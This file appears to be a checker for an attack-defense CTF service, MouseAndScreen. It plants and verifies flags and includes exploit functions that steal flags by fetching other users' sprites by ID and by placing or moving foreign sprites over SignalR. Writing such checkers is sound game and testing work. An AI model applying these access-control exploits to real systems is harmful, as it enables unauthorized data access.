from asyncio import StreamReader, StreamWriter
import asyncio
import json
from re import L
import string
import time
import random
import traceback

from typing import Optional
from logging import LoggerAdapter, getLogger
from httpx import AsyncClient
import faker

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)

from enochecker3.utils import assert_equals, assert_in
from client import MouseAndScreenClient, MessageKind, Session
from util import svg_with_text


CHARSET = string.ascii_letters + string.digits + "_-"
FAKER = faker.Faker(faker.config.AVAILABLE_LOCALES)
checker = Enochecker("MouseAndScreen", 5005)
app = lambda: checker.app

def gen_random_str(k=16):
    return ''.join(random.choices(CHARSET, k=k))

# FLAGS
# Sprite name, placed in no session
@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    username0 = FAKER.name() + str(random.randrange(10, 1000000))
    password0 = gen_random_str()
    async with MouseAndScreenClient(task, username0, password0, logger) as client0:
        await client0.register()
        await client0.upload_sprite(task.flag, svg_with_text(FAKER.name()))
        await db.set("username0", username0)
        await db.set("password0", password0)
        sprite = await get_sprite(client0, task.flag, logger)
        return json.dumps({'spriteId': sprite["id"]})

@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    try:
        username0 = await db.get("username0")
        password0 = await db.get("password0")
    except:
        raise MumbleException("Putflag failed")
    async with MouseAndScreenClient(task, username0, password0, logger) as client0:
        await client0.login()
        sprite = await get_sprite(client0, task.flag, logger)

# PlacedSprite name, placed in a session
@checker.putflag(1)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    username0 = FAKER.name() + str(random.randrange(10, 1000000))
    password0 = gen_random_str()
    username1 = FAKER.name() + str(random.randrange(10, 1000000))
    password1 = gen_random_str()
    session_name = FAKER.catch_phrase() + str(random.randrange(10, 1000000))
    logger.info(f"Creating session '{session_name}' with {username0} and {username1}")
    async with MouseAndScreenClient(task, username0, password0, logger) as client0:
        await client0.register()
        await db.set("username0", username0)
        await db.set("password0", password0)
        hub0 = await client0.enter_signalr_conn(task.address)
        await hub0.join_session(session_name)
        await db.set("session_name", session_name)
        await wait_for_joined(hub0, username0, session_name, logger)

        async with MouseAndScreenClient(task, username1, password1, logger) as client1:
            await client1.register()
            await db.set("username1", username1)
            await db.set("password1", password1)
            hub1 = await client1.enter_signalr_conn(task.address)
            await hub1.join_session(session_name)
            await wait_for_joined(hub1, username1, session_name, logger)
            await wait_for_joined(hub0, username1, session_name, logger)

            sprite_name = FAKER.name() + str(random.randrange(10, 1000000))
            await db.set("sprite_name", sprite_name)
            await client0.upload_sprite(sprite_name, svg_with_text(FAKER.name()))
            sprite = await get_sprite(client0, sprite_name, logger)
            await hub0.place_sprite(session_name, sprite["id"], task.flag, random.randrange(10, 1000), random.randrange(10, 1000))
            await wait_for_moved(hub0, task.flag, sprite["name"], logger)
            msg = await wait_for_moved(hub1, task.flag, sprite["name"], logger)
            await db.set("placedSpriteId", msg["placedSpriteId"])
            return json.dumps({'placedSpriteId': msg["placedSpriteId"]})

@checker.getflag(1)
async def getflag_test(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    try:
        username0 = await db.get("username0")
        password0 = await db.get("password0")
        username1 = await db.get("username1")
        password1 = await db.get("password1")
        session_name = await db.get("session_name")
        sprite_name = await db.get("sprite_name")
        placed_sprite_id = await db.get("placedSpriteId")
    except:
        raise MumbleException("Putflag failed")
    async with MouseAndScreenClient(task, username0, password0, logger) as client0:
        await client0.login()
        sprite = await get_sprite(client0, sprite_name, logger)
        hub0 = await client0.enter_signalr_conn(task.address)
        await hub0.join_session(session_name)
        await asyncio.wait_for(wait_for_moved(hub0, task.flag, sprite["name"], logger), timeout=1.0)

        async with MouseAndScreenClient(task, username1, password1, logger) as client1:
            await client1.login()
            hub1 = await client1.enter_signalr_conn(task.address)
            await hub1.join_session(session_name)
            await wait_for_joined(hub1, username1, session_name, logger)
            await wait_for_joined(hub0, username1, session_name, logger)
            await asyncio.wait_for(wait_for_moved(hub1, task.flag, sprite["name"], logger), timeout=1.0)
            await hub1.move_sprite(session_name, placed_sprite_id, random.randrange(10, 1000), random.randrange(10, 1000))
            await asyncio.wait_for(wait_for_moved(hub0, task.flag, sprite["name"], logger), timeout=1.0)
            await asyncio.wait_for(wait_for_moved(hub1, task.flag, sprite["name"], logger), timeout=1.0)


# Sprite file content in no session
@checker.putflag(2)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    username0 = FAKER.name() + str(random.randrange(10, 1000000))
    password0 = gen_random_str()
    async with MouseAndScreenClient(task, username0, password0, logger) as client0:
        await client0.register()
        sprite_name = FAKER.name()
        await client0.upload_sprite(sprite_name, svg_with_text(task.flag))
        sprite = await get_sprite(client0, sprite_name, logger) # TODO also check if id was stable
        await db.set("url", sprite["url"])
        return json.dumps({'spriteId': sprite["id"]})

@checker.getflag(2)
async def getflag_test(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    try:
        url = await db.get("url")
    except:
        raise MumbleException("Putflag failed")
    
    async with AsyncClient(base_url=f"http://{task.address}:5005/") as http_client:
        response = await http_client.get(url)
        if response.status_code != 200:
            logger.warn(f"Sprite file download failed ({response.status_code}, {response.text})")
        if not task.flag in response.text:
            raise MumbleException("Flag not found in sprite file")

# Background name
@checker.putflag(3)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    username0 = FAKER.name() + str(random.randrange(10, 1000000))
    password0 = gen_random_str()
    session_name = FAKER.catch_phrase() + str(random.randrange(10, 1000000))
    logger.info(f"Creating session '{session_name}' with {username0}")
    async with MouseAndScreenClient(task, username0, password0, logger) as client0:
        await client0.register()
        await db.set("username0", username0)
        await db.set("password0", password0)
        await db.set("session_name", session_name)
        hub0 = await client0.enter_signalr_conn(task.address)
        await hub0.join_session(session_name)
        await wait_for_joined(hub0, username0, session_name, logger)
        await client0.upload_background(task.flag, svg_with_text(FAKER.name()))
        background = await get_background(client0, task.flag, logger)
        await hub0.select_background(session_name, background["url"], task.flag)
        await wait_for_background(hub0, task.flag, logger)

@checker.getflag(3)
async def getflag_test(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> None:
    try:
        session_name = await db.get("session_name")
        username0 = await db.get("username0")
        password0 = await db.get("password0")
    except:
        raise MumbleException("Putflag failed")
    
    async with MouseAndScreenClient(task, username0, password0, logger) as client0:
        await client0.login()
        hub0 = await client0.enter_signalr_conn(task.address)
        await hub0.join_session(session_name)
        await wait_for_joined(hub0, username0, session_name, logger)
        background = await get_background(client0, task.flag, logger)

        username1 = FAKER.name() + str(random.randrange(10, 1000000))
        password1 = gen_random_str()
        async with MouseAndScreenClient(task, username1, password1, logger) as client1:
            await client1.register()
            hub1 = await client1.enter_signalr_conn(task.address)
            await hub1.join_session(session_name)
            await wait_for_joined(hub0, username1, session_name, logger)
            await wait_for_joined(hub1, username1, session_name, logger)
            await hub0.select_background(session_name, background["url"], task.flag)
            await wait_for_background(hub0, task.flag, logger)
            await wait_for_background(hub1, task.flag, logger)

# NOISES

# HAVOCS
@checker.havoc(0)
async def getflag_test(
    task: HavocCheckerTaskMessage, logger: LoggerAdapter
) -> None:
    async with AsyncClient(base_url=f"http://{task.address}:5005") as http_client:
        response = await http_client.get("/")
        if response.status_code != 200:
            raise MumbleException("Could not load index page")

# EXPLOITS
# sprite file url
@checker.exploit(0)
async def getflag_test(
    task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher
) -> None:
    info = json.loads(task.attack_info)
    sprite_id = info["spriteId"]
    async with AsyncClient(base_url=f"http://{task.address}:5005") as http_client:
        response = await http_client.get(f"/usersprites/{sprite_id}")
        flag = searcher.search_flag(response.text)
        if flag:
            return flag

# broadcasted session name, get session name (TODO: get placedsprite names) # TODO sniff bgs instead
@checker.exploit(1)
async def getflag_test(
    task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher
) -> None:
    return
    logger = getLogger()
    logger.warn(f"#### starting exploit 1")
    try:
        username0 = FAKER.name() + str(random.randrange(10, 1000000))
        async with MouseAndScreenClient(task, username0, username0, logger) as client0:
            await client0.register()
            logger.warn(f"#### registered")
            hub0 = await client0.enter_signalr_conn(task.address)
            logger.warn(f"#### connected")
            while True:
                message = await hub0.next_message(MessageKind.SessionJoinedMessage)
                logger.warn(f"#### got {str(message)}")
                flag = searcher.search_flag(str(message))
                if flag:
                    return flag
    except Exception as e:
        logger.warn(f"#### {e}")

# place all sprites, get name
@checker.exploit(2)
async def getflag_test(
    task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher
) -> None:
    info = json.loads(task.attack_info)
    sprite_id = int(info["spriteId"])
    logger = getLogger()
    logger.warn(f"!!!! starting exploit 2")
    username0 = FAKER.name() + str(random.randrange(10, 1000000))
    session_name = FAKER.catch_phrase() + str(random.randrange(10, 1000000))
    try:
        async with MouseAndScreenClient(task, username0, username0, logger) as client0:
            await client0.register()
            hub0 = await client0.enter_signalr_conn(task.address)
            await hub0.join_session(session_name)
            logger.warn(f"!!!! placing sprite {sprite_id}")
            try:
                await hub0.place_sprite(session_name, sprite_id, username0, 42, 42)
            except:
                pass
            logger.warn(f"!!!! investigating queue")
            while True:
                msg = await asyncio.wait_for(hub0.next_message(MessageKind.SpriteMovedMessage), timeout=1)
                logger.warn(f"!!!! {msg}")
                flag = searcher.search_flag(msg["spriteName"])
                if flag:
                    return flag
    except Exception as e:
        logger.critical("!!!!" + traceback.format_exc().replace("\n", ""))
        logger.exception(e)

# place all sprites, get file content
@checker.exploit(3)
async def getflag_test(
    task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher
) -> None:
    logger = getLogger()
    info = json.loads(task.attack_info)
    sprite_id = int(info["spriteId"])
    username0 = FAKER.name() + str(random.randrange(10, 1000000))
    session_name = FAKER.catch_phrase() + str(random.randrange(10, 1000000))
    try:
        async with MouseAndScreenClient(task, username0, username0, logger) as client0:
            await client0.register()
            hub0 = await client0.enter_signalr_conn(task.address)
            await hub0.join_session(session_name)
            await hub0.place_sprite(session_name, sprite_id, username0, 42, 42)
            while True:
                msg = await asyncio.wait_for(hub0.next_message(MessageKind.SpriteMovedMessage), timeout=1)
                async with AsyncClient(base_url=f"http://{task.address}:5005") as http_client:
                    response = await http_client.get(msg["url"])
                    flag = searcher.search_flag(response.text)
                    if flag:
                        return flag
    except Exception as e:
        logger.critical("!!!!" + traceback.format_exc().replace("\n", ""))
        logger.exception(e)

# place all sprites, get sprite name
@checker.exploit(4)
async def getflag_test(
    task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher
) -> None:
    logger = getLogger()
    info = json.loads(task.attack_info)
    placed_sprite_id = int(info["placedSpriteId"])
    try:
        username0 = FAKER.name() + str(random.randrange(10, 1000000))
        session_name = FAKER.catch_phrase() + str(random.randrange(10, 1000000))
        async with MouseAndScreenClient(task, username0, username0, logger) as client0:
            await client0.register()
            hub0 = await client0.enter_signalr_conn(task.address)
            await hub0.join_session(session_name)
            await hub0.move_sprite(session_name, placed_sprite_id, 0, 0)
            while True:
                msg = await asyncio.wait_for(hub0.next_message(MessageKind.SpriteMovedMessage), timeout=1)
                placed_sprite_name = msg["name"]
                flag = searcher.search_flag(placed_sprite_name)
                if flag:
                    return flag
    except Exception as e:
        logger.critical("++++" + traceback.format_exc().replace("\n", ""))
        logger.exception(e)

# Util
async def get_sprite(client: MouseAndScreenClient, name: str, logger: LoggerAdapter):
    sprites = await client.get_sprites()
    try:
        sprites = json.loads(sprites)
        for sprite in sprites["ownSprites"]:
            if sprite["name"] == name and isinstance(sprite["id"], int) and isinstance(sprite["url"], str):
                return sprite
    except:
        logger.info(f"Invalid response {sprites}")
        raise MumbleException("Invalid response (/api/resources/sprites)")
    raise MumbleException("Sprite not found (/api/resources/sprites)")

async def get_background(client: MouseAndScreenClient, name: str, logger: LoggerAdapter):
    backgrounds = await client.get_backgrounds()
    try:
        backgrounds = json.loads(backgrounds)
        for background in backgrounds["ownBackgrounds"]:
            if background["name"] == name and isinstance(background["id"], int) and isinstance(background["url"], str):
                return background
    except:
        logger.info(f"Invalid response {backgrounds}")
        raise MumbleException("Invalid response (/api/resources/backgrounds)")
    raise MumbleException("Sprite not found (/api/resources/backgrounds)")

async def wait_for_joined(hub: Session, username: str, session_name: str, logger: LoggerAdapter):
    while True:
        message = await hub.next_message(MessageKind.SessionJoinedMessage)
        try:
            user = message["username"]
            session = message["session"]
            if user == username and session == session_name:
                logger.info(f"Received SessionJoinedMessage {message}")
                break
            else:
                logger.info(f"Received SessionJoinedMessage {message}, waiting for next message")
        except:
            logger.warn(f"Invalid SessionJoinedMessage '{message}'")
            raise MumbleException("Invalid SessionJoinedMessage")

async def wait_for_moved(hub: Session, placedsprite_name: str, sprite_name: str, logger: LoggerAdapter):
    while True:
        message = await hub.next_message(MessageKind.SpriteMovedMessage)
        try:
            received_name = message["name"]
            received_sprite_name = message["spriteName"]
            received_placedsprite_id = message["placedSpriteId"]
            if received_name == placedsprite_name and received_sprite_name == sprite_name and isinstance(received_placedsprite_id, int):
                logger.info(f"Received SpriteMovedMessage {message}")
                return message
            else:
                logger.info(f"Received SpriteMovedMessage {message}, waiting for next message")
        except:
            logger.warn(f"Invalid SpriteMovedMessage '{message}'")
            raise MumbleException("Invalid SpriteMovedMessage")

async def wait_for_background(hub: Session, bg_name: str, logger: LoggerAdapter):
    while True:
        message = await hub.next_message(MessageKind.BackgroundChangedMessage)
        try:
            received_name = message["name"]
            if received_name == bg_name:
                logger.info(f"Received BackgroundChangedMessage {message}")
                return message
            else:
                logger.info(f"Received BackgroundChangedMessage {message}, waiting for next message")
        except:
            logger.warn(f"Invalid BackgroundChangedMessage '{message}'")
            raise MumbleException("Invalid BackgroundChangedMessage")

if __name__ == "__main__":
    checker.run()
